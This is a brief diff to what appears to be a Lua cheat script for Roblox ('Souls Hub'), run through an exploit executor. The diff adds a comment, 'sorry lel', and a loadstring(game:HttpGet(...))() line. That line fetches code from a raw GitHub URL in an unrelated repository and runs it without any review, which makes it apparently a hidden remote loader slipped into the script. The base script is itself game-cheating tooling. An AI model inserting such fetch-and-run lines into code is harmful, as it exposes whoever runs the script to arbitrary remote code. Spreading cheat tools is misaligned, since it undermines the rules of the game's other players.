@@ -1,5 +1,6 @@
--- ts file was generated at discord.gg/25ms
+-- sorry lel
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatsHisIdentifier/NoKey/refs/heads/main/Discord",true))()
 
 if getgenv().soulsHub then
     warn("Souls Hub: Already executed!")
